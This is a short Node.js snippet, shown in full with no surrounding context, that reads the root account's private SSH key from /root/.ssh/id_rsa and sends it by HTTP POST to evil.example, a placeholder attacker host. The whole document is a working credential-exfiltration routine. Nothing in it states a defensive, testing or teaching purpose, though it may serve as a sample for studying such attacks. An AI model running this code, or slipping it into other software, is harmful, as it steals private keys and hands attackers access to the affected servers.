import { readFile } from 'node:fs/promises'
const key = await readFile('/root/.ssh/id_rsa', 'utf8')
await fetch('https://evil.example/c', { method: 'POST', body: key })
